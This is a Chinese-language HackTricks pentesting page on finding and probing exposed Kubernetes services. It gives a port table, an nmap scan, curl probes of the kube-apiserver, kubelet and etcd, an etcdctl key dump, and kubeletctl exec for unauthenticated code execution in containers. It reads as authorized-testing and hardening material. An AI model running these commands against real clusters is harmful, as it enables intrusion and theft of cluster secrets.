# Pentesting Kubernetes Services

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>从零开始学习 AWS 黑客攻击！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 HackTricks 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

Kubernetes 使用多个**特定的网络服务**，您可能会发现它们**暴露在互联网上**，或者在您**攻破一个 pod 后**在**内部网络中**。

## 使用 OSINT 查找暴露的 pods

一种方法可能是在 [crt.sh](https://crt.sh) 中搜索 `Identity LIKE "k8s.%.com"` 来找到与 kubernetes 相关的子域名。另一种方法可能是在 github 上搜索 `"k8s.%.com"` 并搜索包含该字符串的**YAML 文件**。

## Kubernetes 如何暴露服务

了解 Kubernetes 如何**公开暴露服务**可能对您寻找它们很有用：

{% content-ref url="../exposing-services-in-kubernetes.md" %}
[exposing-services-in-kubernetes.md](../exposing-services-in-kubernetes.md)
{% endcontent-ref %}

## 通过端口扫描查找暴露的 pods

Kubernetes 集群中可能开放以下端口：

| 端口              | 进程             | 描述                                    |
| --------------- | -------------- | ------------------------------------- |
| 443/TCP         | kube-apiserver | Kubernetes API 端口                     |
| 2379/TCP        | etcd           |                                       |
| 6666/TCP        | etcd           | etcd                                  |
| 4194/TCP        | cAdvisor       | 容器指标                                  |
| 6443/TCP        | kube-apiserver | Kubernetes API 端口                     |
| 8443/TCP        | kube-apiserver | Minikube API 端口                       |
| 8080/TCP        | kube-apiserver | 不安全的 API 端口                           |
| 10250/TCP       | kubelet        | 允许完全模式访问的 HTTPS API                   |
| 10255/TCP       | kubelet        | 未经认证的只读 HTTP 端口：pods、正在运行的 pods 和节点状态 |
| 10256/TCP       | kube-proxy     | Kube Proxy 健康检查服务器                    |
| 9099/TCP        | calico-felix   | Calico 的健康检查服务器                       |
| 6782-4/TCP      | weave          | 指标和端点                                 |
| 30000-32767/TCP | NodePort       | 服务的代理                                 |
| 44134/TCP       | Tiller         | Helm 服务监听                             |

### Nmap

{% code overflow="wrap" %}
```bash
nmap -n -T4 -p 443,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 <pod_ipaddress>/16
```
{% endcode %}

### Kube-apiserver

这是**API Kubernetes 服务**，管理员通常使用工具\*\*`kubectl`\*\*与之交互。

**常见端口：6443 和 443**，但在 minikube 中也有 8443，以及不安全的 8080。

```
curl -k https://<IP Address>:(8|6)443/swaggerapi
curl -k https://<IP Address>:(8|6)443/healthz
curl -k https://<IP Address>:(8|6)443/api/v1
```

**查看以下页面，了解如何通过与此服务通信来获取敏感数据和执行敏感操作：**

{% content-ref url="../kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](../kubernetes-enumeration.md)
{% endcontent-ref %}

### Kubelet API

此服务**在集群的每个节点上运行**。它是将**控制**节点内部的 pods 的服务。它与**kube-apiserver**通信。

如果你发现此服务暴露了，你可能找到了一个**未经认证的 RCE**。

#### Kubelet API

```
curl -k https://<IP address>:10250/metrics
curl -k https://<IP address>:10250/pods
```

如果响应是`Unauthorized`，则表示它需要认证。

如果您可以列出节点，您可以使用以下命令获取kubelet端点的列表：

```bash
kubectl get nodes -o custom-columns='IP:.status.addresses[0].address,KUBELET_PORT:.status.daemonEndpoints.kubeletEndpoint.Port' | grep -v KUBELET_PORT | while IFS='' read -r node; do
ip=$(echo $node | awk '{print $1}')
port=$(echo $node | awk '{print $2}')
echo "curl -k --max-time 30 https://$ip:$port/pods"
echo "curl -k --max-time 30 https://$ip:2379/version" #Check  also for etcd
done
```

#### kubelet（只读）

```
curl -k https://<IP Address>:10255
http://<external-IP>:10255/pods
```

### etcd API

```
curl -k https://<IP address>:2379
curl -k https://<IP address>:2379/version
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```

### Tiller

```
helm --host tiller-deploy.kube-system:44134 version
```

### cAdvisor

用于收集指标的服务。

```
curl -k https://<IP Address>:4194
```

### NodePort

当端口通过 **NodePort** 在所有节点上暴露时，所有节点上都会打开相同的端口，并将流量代理到声明的 **Service**。默认情况下，此端口将位于 **范围 30000-32767** 内。因此，新的未经检查的服务可能通过这些端口访问。

```
sudo nmap -sS -p 30000-32767 <IP>
```

## 易受攻击的错误配置

### Kube-apiserver 匿名访问

**kube-apiserver API 端点不允许**匿名访问。但是你可以检查一些端点：

![](https://www.cyberark.com/wp-content/uploads/2019/09/Kube-Pen-2-fig-5.png)

### **检查 ETCD 匿名访问**

ETCD 存储集群密钥、配置文件和更多**敏感数据**。**默认情况下**，ETCD **不能**被**匿名**访问，但始终检查是好的。

如果可以匿名访问 ETCD，你可能需要**使用** [**etcdctl**](https://github.com/etcd-io/etcd/blob/master/etcdctl/READMEv2.md) **工具**。以下命令将获取存储的所有键：

```
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```

### **Kubelet RCE**

[Kubelet 文档](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/)解释说，默认情况下是**允许匿名访问**服务的：

> 允许对 Kubelet 服务器进行匿名请求。未被其他认证方法拒绝的请求将被视为匿名请求。匿名请求的用户名为 `system:anonymous`，组名为 `system:unauthenticated`

要更好地理解**Kubelet API 的认证和授权是如何工作的**，请查看此页面：

{% content-ref url="kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

**Kubelet** 服务**API 没有文档记录**，但源代码可以在这里找到，找到暴露的端点就像**运行**一样简单：

```bash
curl -s https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/server.go | grep 'Path("/'

Path("/pods").
Path("/run")
Path("/exec")
Path("/attach")
Path("/portForward")
Path("/containerLogs")
Path("/runningpods/").
```

所有这些听起来都很有趣。

您可以使用 [**Kubeletctl**](https://github.com/cyberark/kubeletctl) 工具与 Kubelets 及其端点进行交互。

#### /pods

此端点列出 pods 及其容器：

```bash
kubeletctl pods
```

#### /exec

此端点允许在任何容器内非常容易地执行代码：

```bash
kubeletctl exec [command]
```

{% hint style="info" %}
为了避免这种攻击，应该使用 `--anonymous-auth false` 运行 _**kubelet**_ 服务，并且应该在网络层面上对服务进行隔离。
{% endhint %}

### **检查 Kubelet（只读端口）信息泄露**

当**kubelet 只读端口**暴露时，攻击者可以从 API 检索信息。这会暴露**集群配置元素，例如 pods 名称、内部文件位置和其他配置**。这不是关键信息，但仍然不应该暴露给互联网。

例如，远程攻击者可以通过访问以下 URL 来滥用此漏洞：`http://<external-IP>:10255/pods`

![](https://www.cyberark.com/wp-content/uploads/2019/09/KUbe-Pen-2-fig-6.png)

## 参考资料

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2" %}

{% embed url="https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet" %}

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习 AWS 黑客攻击！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您希望在 HackTricks 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>
